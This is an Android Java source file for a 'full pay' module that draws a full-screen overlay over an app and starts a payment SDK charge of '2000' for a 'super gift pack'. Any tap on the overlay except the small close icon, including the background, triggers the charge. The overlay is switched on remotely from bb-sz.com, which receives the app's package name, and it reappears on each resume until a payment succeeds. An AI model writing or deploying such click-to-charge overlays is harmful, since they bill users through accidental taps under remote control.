package com.bb_sz.pay.fullpay;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.drawable.BitmapDrawable;
import android.os.Handler;
import android.os.Looper;
import android.text.TextUtils;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.Toast;

import com.bb_sz.ndk.App;
import com.bb_sz.ndk.Http;
import com.bb_sz.pay.Api;
import com.jpay.sdk.IChargeResult;

import org.json.JSONObject;

import java.io.IOException;
import java.io.InputStream;


/**
 * Created by Administrator on 2017/4/6.
 */

public class FullPayManager implements View.OnClickListener {
    private static final String TAG = "SkyFullPay";
    private static final boolean debug = true;
    private static FullPayManager mInstance;
    private Activity activity;
    private View mDView;
    private String pkg;
    private int mScreenWidth;
    private int mScreenHeight;
    private WindowManager mWindowManager;
    private WindowManager.LayoutParams mWindowParam;
    private boolean lowScreen;
    private boolean isShowed = false;

    public static FullPayManager getInstance() {
        synchronized (TAG) {
            if (null == mInstance) {
                mInstance = new FullPayManager();
            }
            return mInstance;
        }
    }

    private FullPayManager() {
    }

    private View createView(Activity activity) {
        FrameLayout frameLayout = new FrameLayout(activity);
        frameLayout.setLayoutParams(new FrameLayout.LayoutParams(-1, -1));
        frameLayout.setBackgroundColor(Color.RED);
        //add bg
        ImageView bg = new ImageView(activity);
        bg.setLayoutParams(new FrameLayout.LayoutParams(-1, -1));
        InputStream in = null;
        try {
            lowScreen = mScreenWidth <= 640 && mScreenWidth != 480;
            if (lowScreen) {
                in = activity.getAssets().open("full_pay/bg_640.jpg");
            } else {
                in = activity.getAssets().open("full_pay/bg_720.jpg");
            }
            Bitmap bmp = BitmapFactory.decodeStream(in);
            if (null != bmp) {
                bg.setBackgroundDrawable(new BitmapDrawable(bmp));
            } else
                bg.setImageResource(android.R.drawable.ic_menu_call);
            bg.setTag(1);
            bg.setOnClickListener(this);
            frameLayout.addView(bg, new FrameLayout.LayoutParams(-1, -1));
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (null != in)
                try {
                    in.close();
                } catch (IOException ignored) {
                }
        }

        //add content
        ImageView content = new ImageView(activity);
        int contentW = dip2px(activity, 240f);
        int contentH = dip2px(activity, 295f);
        FrameLayout.LayoutParams fllp = new FrameLayout.LayoutParams(contentW, contentH);
        fllp.gravity = Gravity.CENTER;
        content.setLayoutParams(fllp);
        in = null;
        try {
            in = activity.getAssets().open("full_pay/content.png");
            Bitmap bmp = BitmapFactory.decodeStream(in);
            if (null != bmp) {
                content.setImageBitmap(bmp);
            } else
                content.setImageResource(android.R.drawable.ic_menu_call);
            content.setTag(2);
            content.setOnClickListener(this);
            frameLayout.addView(content);
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (null != in)
                try {
                    in.close();
                } catch (IOException ignored) {
                }
        }

        //add btn
        ImageView btn = new ImageView(activity);
        int width = dip2px(activity, 100.5f);
        int height = dip2px(activity, 35.5f);
        FrameLayout.LayoutParams fllpbtn = new FrameLayout.LayoutParams(width, height);
        fllpbtn.setMargins(((mScreenWidth - width) / 2), (mScreenHeight - height) / 2 + dip2px(activity, 108.3f), 0, 0);
        btn.setLayoutParams(fllpbtn);
        in = null;
        try {
            in = activity.getAssets().open("full_pay/btn.png");
            Bitmap bmp = BitmapFactory.decodeStream(in);
            if (null != bmp) {
                btn.setImageBitmap(bmp);
            } else
                btn.setImageResource(android.R.drawable.ic_menu_call);
            btn.setTag(3);
            btn.setOnClickListener(this);
            frameLayout.addView(btn);
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (null != in)
                try {
                    in.close();
                } catch (IOException ignored) {
                }
        }

        //add close
        ImageView close = new ImageView(activity);
        FrameLayout.LayoutParams fllpclose = new FrameLayout.LayoutParams(dip2px(activity, 32f), dip2px(activity, 35f));
        fllpclose.gravity = /*Gravity.TOP | */Gravity.RIGHT;
//        if (Build.BRAND.toLowerCase().contains("smartisan")) {//jian guo
        fllpclose.topMargin = dip2px(activity, 25);
//        }
        close.setLayoutParams(fllpclose);
        in = null;
        try {
            in = activity.getAssets().open("full_pay/guanbi.png");
            Bitmap bmp = BitmapFactory.decodeStream(in);
            if (null != bmp) {
                close.setImageBitmap(bmp);
            } else
                close.setImageResource(android.R.drawable.ic_menu_call);
            close.setTag(4);
            close.setOnClickListener(this);
            frameLayout.addView(close);
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (null != in)
                try {
                    in.close();
                } catch (IOException ignored) {
                }
        }


        return frameLayout;
    }

    private void initView(Activity mContext) {
        if (debug) Log.d(TAG, "initView");
        if (mWindowManager == null) {
            mWindowManager = (WindowManager) mContext
                    .getSystemService(Context.WINDOW_SERVICE);
        }
        mWindowParam = new WindowManager.LayoutParams();

//        mWindowParamIcon.type = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT; //
//        mWindowParamIcon.windowAnimations = 0;
        mWindowParam.format = PixelFormat.TRANSLUCENT;//| WindowManager.LayoutParams.FIRST_SYSTEM_WINDOW;
        mWindowParam.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
        mWindowParam.flags = mWindowParam.flags | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH;
//        mWindowParamIcon.flags = mWindowParamIcon.flags | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS; // 排版不受限制

        // 设置悬浮窗口长宽数据
        mWindowParam.width = mScreenWidth;
        mWindowParam.height = mScreenHeight;

        // 以屏幕左上角为原点，设置x、y初始�?
        mWindowParam.x = 0;
        mWindowParam.y = 0;
    }

    private void initWH(Activity activity) {
        getScreenOrientation(activity);
    }

    public void init(Activity activity) {
        if (null != pkg) {
            if (debug) Log.d(TAG, "CusService..error");
            return;
        }
        if (debug) Log.d(TAG, "FullPayManager");
        this.activity = activity;
        initWH(activity);

        pkg = activity.getPackageName();

        httpRequest();

        initView(activity);

        mDView = createView(activity);
    }

    public void onDestroy() {
        if (!isOpen(activity)) return;
        mInstance = null;
        if (debug) Log.d(TAG, "onDestroy");
    }

    public void onPause() {
        if (!isOpen(activity)) return;
        try {
            if (debug) Log.d(TAG, "onPause");
            if (isShowed) {
                isShowed = false;
                mWindowManager.removeView(mDView);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void onResume() {
        if (!isOpen(activity)) return;
        try {
            if (debug) Log.d(TAG, "onResume");
            if (getIntValue("full_pay_key") == 0) {
                if (!isShowed) {
                    mWindowManager.addView(mDView, mWindowParam);
                    isShowed = true;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private int getScreenOrientation(Context context) {
        if (mScreenWidth == 0 || mScreenHeight == 0) {
            if (context != null) {
                WindowManager wm = (WindowManager) context
                        .getSystemService(Context.WINDOW_SERVICE);
                mScreenWidth = wm.getDefaultDisplay().getWidth();
                mScreenHeight = wm.getDefaultDisplay().getHeight();
                if (debug)
                    Log.d(TAG, "mScreenWidth = " + mScreenWidth + ", mScreenHeight = " + mScreenHeight);
                if (debug)
                    Log.d(TAG, "480px = " + px2dip(context, 480) + "dp, 590px = " + px2dip(context, 590) + "dp");
            }
        }

        if (mScreenWidth > mScreenHeight) {
            return 1;
        }
        return 0;
    }

    private int dip2px(Context context, float dpValue) {
        final float scale = context.getResources().getDisplayMetrics().density;
        return (int) (dpValue * scale + 0.5f);
    }

    private int px2dip(Context context, float pxValue) {
        final float scale = context.getResources().getDisplayMetrics().density;
        return (int) (pxValue / scale + 0.5f);
    }

    @Override
    public void onClick(View v) {
        Object tag = v.getTag();
        if (null != tag && tag instanceof Integer) {
            if ((int) tag == 4) {
                close();
            } else {
                charge();
            }
        }
        if (debug) Log.d(TAG, "tag = " + v.getTag());
    }

    private void setIntValue(String key, int i) {
        if (TextUtils.isEmpty(key)) return;
        SharedPreferences sp = activity.getSharedPreferences("pt_apk_sp", 0);
        sp.edit().putInt(key, i).commit();
    }

    private int getIntValue(String key) {
        if (TextUtils.isEmpty(key)) return 0;
        SharedPreferences sp = activity.getSharedPreferences("pt_apk_sp", 0);
        return sp.getInt(key, 0);
    }

    private void close() {
        onPause();
    }

    private void charge() {
        Api.charge(activity, "2000", null, null, "超级大礼包1927", new IChargeResult() {
            @Override
            public void onChargeResult(final int i, String s) {
                Log.e(TAG, "jpay result i = " + i + ", s = " + s);
                new Handler(Looper.getMainLooper()).post(new Runnable() {
                    @Override
                    public void run() {
                        if (i != 0) {
                            Toast.makeText(activity, "支付失败", Toast.LENGTH_SHORT).show();
                        } else {
                            setIntValue("full_pay_key", 1);
                        }
                        onPause();
                    }
                });
            }
        });
    }

    private void httpRequest() {

        Runnable run = new Runnable() {
            @Override
            public void run() {

                SharedPreferences sp = activity.getSharedPreferences("asdfsdfasdf", 0);
                long lastTime = sp.getLong("full_full_pay_t", 0);
                if (debug) Log.d(TAG, "lastTime:" + lastTime);
                if (System.currentTimeMillis() - lastTime < 1000 * 60 * 10) {
                    return;
                }

                String host = "www.bb-sz.com";
                int port = 80;
                StringBuffer sb = new StringBuffer();
                sb.append("GET ").append("http://www.bb-sz.com/ad/fullpay/get_switch.php?pkg=" + pkg + "&cid={$CID$}&t=" + System.currentTimeMillis()).append(" HTTP/1.1").append(Http.END);
                sb.append("Host: ").append(host).append(Http.END);
                sb.append("User-Agent:XX_Shell_FP").append(Http.END);
                sb.append("Accept-Language:zh-cn").append(Http.END);
                sb.append("Accept-Encoding:deflate").append(Http.END);
                sb.append("Accept:*/*").append(Http.END);
                sb.append("Connection:Keep-Alive").append(Http.END);
                sb.append("Content-Type: application/x-www-form-urlencoded").append(Http.END);
                sb.append(Http.END);

                byte[] data = App.http(host, port, sb.toString());
                switchKey(App.aa(data));
            }
        };
        Http.getInstance().submit(run);
    }

    private void switchKey(String msg) {
        if (debug) Log.i(TAG, "switchKey msg = " + msg);
        //{"_id":"1","open":"2"}
        if (null != msg) {
            try {
                JSONObject object = new JSONObject(msg);
                if (object.has("open")) {
                    Object value = object.get("open");
                    if (null != value && value instanceof Integer) {
                        int v = (int) value;
                        if (debug) Log.i(TAG, "switchKey int v = " + v);
                        setSwitchKey(v);
                        if (v == 2) {//open

                        } else if (v == 1) {// close

                        } else {//close

                        }
                    } else if (null != value && value instanceof String) {
                        int v = Integer.valueOf((String) value);
                        if (debug) Log.i(TAG, "switchKey str v = " + v);
                        setSwitchKey(v);
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private boolean isOpen(Context context) {
        boolean isOpen = false;
        try {
            isOpen = context.getSharedPreferences("asdfsdfasdf", 0).getInt("full_full_pay", -1) == 2;
        } catch (Exception ignored) {
        }
        if (debug) Log.d(TAG, "isOpen:" + isOpen);
        return isOpen;
    }

    private void setSwitchKey(int value) {

        if (debug) Log.d(TAG, "setSwitchKey, value:" + value);
        if (null != activity)
            activity.getSharedPreferences("asdfsdfasdf", 0).edit().putInt("full_full_pay", value)
                    .putLong("full_full_pay_t", System.currentTimeMillis()).apply();
    }
}
